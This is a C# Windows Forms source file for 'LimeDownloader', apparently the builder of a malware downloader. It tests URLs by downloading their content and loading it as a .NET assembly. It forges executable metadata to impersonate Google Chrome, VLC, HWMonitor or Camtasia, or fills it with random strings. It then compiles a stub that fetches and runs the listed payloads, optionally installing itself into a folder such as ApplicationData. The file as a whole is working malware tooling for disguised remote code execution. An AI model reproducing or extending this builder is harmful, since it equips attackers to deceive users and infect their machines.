using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Timers;
using System.Threading.Tasks;
using System.Diagnostics;

namespace LimeDownloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        List<string> ListOfURLS = new List<string>();
        async private void button3_Click(object sender, EventArgs e)
        {
            string URL = Interaction.InputBox("Add Direct Link", "Add URL", "https://dropmyb.in/");
            if (string.IsNullOrEmpty(URL))
                return;
            else
            {
                if (!ListOfURLS.Contains(URL))
                {
                    ListViewItem LV = new ListViewItem();
                    LV.Text = URL;
                    LV.SubItems.Add("Testing");
                    listView1.Items.Insert(0, LV);
                    string Valid = await DownloadDataAsync(URL);
                    LV.SubItems[1].Text = Valid;
                    if (Valid == "Valid")
                    {
                        LV.ForeColor = Color.Green;
                        ListOfURLS.Add(URL);
                    }
                    else
                    {
                        LV.ForeColor = Color.Red;
                    }
                }
            }
        }



        private async Task<string> DownloadDataAsync(string url)
        {
            string result = "";
            await Task.Run(() =>
            {
                using (WebClient WC = new WebClient())
                {
                    try
                    {
                        NetworkCredential MyCredentials = new NetworkCredential();
                        WC.Credentials = MyCredentials;
                        byte[] Payload = WC.DownloadData(url);
                        System.Reflection.Assembly.Load(Payload);
                        result = "Valid";
                    }
                    catch (WebException)
                    {
                        result = "Invalid URL";
                    }
                    catch (BadImageFormatException)
                    {
                        result = "Invalid Assembly";
                    }
                }
            });
            return result;
        }


        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            foreach (ListViewItem url in listView1.SelectedItems)
            {
                    ListOfURLS.Remove(url.Text);
                    url.Remove();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog o = new OpenFileDialog();
            o.Filter = "Executable |*.exe";
            if (o.ShowDialog() == DialogResult.OK)
            {
                FileVersionInfo info = FileVersionInfo.GetVersionInfo(o.FileName);

                try
                {
                    txtTitle.Text = info.InternalName;
                    txtDescription.Text = info.FileDescription;
                    txtProduct.Text = info.CompanyName;
                    txtCompany.Text = info.ProductName;
                    txtCopyright.Text = info.LegalCopyright;
                    txtTrademark.Text = info.LegalTrademarks;
                }
                catch
                {
                }



                string[] version;
                if (info.FileVersion.Contains(","))
                    version = info.FileVersion.Split(',');
                else
                    version = info.FileVersion.Split('.');

                try
                {
                    num_Assembly1.Text = version[0];
                    num_Assembly2.Text = version[1];
                    num_Assembly3.Text = version[2];
                    num_Assembly4.Text = version[3];
                }
                catch
                {
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                switch (rand.Next(6))
                {
                    case 0:
                        {
                            txtTitle.Text = "chrome_exe";
                            txtDescription.Text = "Google Chrome";
                            txtProduct.Text = "Google Chrome";
                            txtCompany.Text = "Google Inc.";
                            txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved.";
                            txtTrademark.Text = "";
                            num_Assembly1.Text = "67";
                            num_Assembly2.Text = "0";
                            num_Assembly3.Text = "3396";
                            num_Assembly4.Text = "99";
                            break;
                        }

                    case 1:
                        {
                            txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10));
                            txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10));
                            txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10));
                            txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10));
                            txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10));
                            txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10));
                            num_Assembly1.Value = rand.Next(0, 10);
                            num_Assembly2.Value = rand.Next(0, 10);
                            num_Assembly3.Value = rand.Next(0, 10);
                            num_Assembly4.Value = rand.Next(0, 10);
                            break;
                        }

                    case 2:
                        {
                            txtTitle.Text = "vlc";
                            txtDescription.Text = "VLC media player";
                            txtProduct.Text = "VLC media player";
                            txtCompany.Text = "VideoLAN";
                            txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors";
                            txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN";
                            num_Assembly1.Text = "3";
                            num_Assembly2.Text = "0";
                            num_Assembly3.Text = "3";
                            num_Assembly4.Text = "0";
                            break;
                        }

                    case 3:
                        {
                            txtTitle.Text = "HWMonitor.exe";
                            txtDescription.Text = "HWMonitor";
                            txtProduct.Text = "CPUID Hardware Monitor";
                            txtCompany.Text = "CPUID";
                            txtCopyright.Text = "(c)2008-2018 CPUID.  All rights reserved.";
                            txtTrademark.Text = "";
                            num_Assembly1.Text = "1";
                            num_Assembly2.Text = "3";
                            num_Assembly3.Text = "4";
                            num_Assembly4.Text = "0";
                            break;
                        }

                    case 4:
                        {
                            txtTitle.Text = "CamtasiaStudio.exe";
                            txtDescription.Text = "TechSmith Camtasia 2018";
                            txtProduct.Text = "Camtasia";
                            txtCompany.Text = "TechSmith Corporation";
                            txtCopyright.Text = "Copyright © 2011-2018 TechSmith Corporation. All rights reserved.";
                            txtTrademark.Text = "18";
                            num_Assembly1.Text = "0";
                            num_Assembly2.Text = "0";
                            num_Assembly3.Text = "31";
                            num_Assembly4.Text = "0";
                            break;
                        }

                    case 5:
                        {
                            txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20));
                            txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20));
                            txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20));
                            txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20));
                            txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20));
                            txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20));
                            num_Assembly1.Value = rand.Next(0, 10);
                            num_Assembly2.Value = rand.Next(0, 10);
                            num_Assembly3.Value = rand.Next(0, 10);
                            num_Assembly4.Value = rand.Next(0, 10);
                            break;
                        }
                }
            }
            catch
            {
            }
        }

        public static Random rand = new Random();
        public static string Randomi(int lenght)
        {
            string Chr = "asdfghjklqwertyuiopmnbvcxz";
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= lenght; i++)
            {
                int idx = rand.Next(0, Chr.Length);
                sb.Append(Chr.Substring(idx, 1));
            }
            return sb.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog o = new OpenFileDialog();
            o.Filter = "Icon |*.ico";
            if (o.ShowDialog() == DialogResult.OK)
            {
                txtIcon.Text = o.FileName;
                pictureBox1.ImageLocation = o.FileName;
            }
            else
            {
                txtIcon.Text = null;
                pictureBox1.ImageLocation = null;
            }
        }


        private void txtIcon_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtIcon.Text))
            {
                txtIcon.Text = null;
                pictureBox1.ImageLocation = null;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count == 0) return;
            List<string> URLS = new List<string>();
            foreach (ListViewItem url in listView1.Items)
            {
                if (url.SubItems[1].Text == "Valid")
                    URLS.Add(url.SubItems[0].Text);
            }

            if (URLS.Count == 0) return;
            try
            {
                SaveFileDialog o = new SaveFileDialog();
                o.Filter = "Executable |*.exe";
                if (o.ShowDialog() == DialogResult.OK)
                {

                    string Source = Properties.Resources.Stub;
                    Source = Source.Replace("$URL$", string.Join(", ", URLS.ToList()).Replace(",", Strings.ChrW(34) + "," + Strings.ChrW(34)));
                    Source = Source.Replace("%Title%", txtTitle.Text);
                    Source = Source.Replace("%Description%", txtDescription.Text);
                    Source = Source.Replace("%Product", txtProduct.Text);
                    Source = Source.Replace("%Company%", txtCompany.Text);
                    Source = Source.Replace("%Copyright", txtCopyright.Text);
                    Source = Source.Replace("%Trademark%", txtTrademark.Text);
                    Source = Source.Replace("%v1%", num_Assembly1.Text);
                    Source = Source.Replace("%v2%", num_Assembly2.Text);
                    Source = Source.Replace("%v3%", num_Assembly3.Text);
                    Source = Source.Replace("%v4%", num_Assembly4.Text);
                    Source = Source.Replace("%Guid%", Guid.NewGuid().ToString());

                    if (chkINS.Checked)
                    {
                        if (string.IsNullOrWhiteSpace(textBox1.Text)) return;
                        if (!textBox1.Text.EndsWith(".exe"))
                            textBox1.Text = textBox1.Text + ".exe";
                        Source = Source.Replace("#undef INS", "#define INS");
                        Source = Source.Replace("%EXE%", textBox1.Text);
                        Source = Source.Replace("%DIR%", comboBox1.Text);

                    }

                    bool isOK = false;
                    if (string.IsNullOrWhiteSpace(txtIcon.Text))
                        isOK = Compiler.CompileFromSource(Source, o.FileName, null);
                    else
                        isOK = Compiler.CompileFromSource(Source, o.FileName, txtIcon.Text);

                    if (isOK == true)
                        MessageBox.Show("Done!");

                }
            }
            catch (Exception ex)
            {
                labelBuild.Text = ex.Message;
            }
        }

        private void label9_Click(object sender, EventArgs e)
        {

        }


        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (chkINS.Checked)
            {
                comboBox1.Enabled = true;
                textBox1.Enabled = true;
            }
            else
            {
                comboBox1.Enabled = false;
                textBox1.Enabled = false;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
                foreach (var typeSpecialFolder in Environment.SpecialFolder.GetValues(typeof(Environment.SpecialFolder)))
            {
                comboBox1.Items.Add(typeSpecialFolder);
                if (typeSpecialFolder.ToString() == "ApplicationData")
                    comboBox1.Text = "ApplicationData";
            }
        }
    }
}
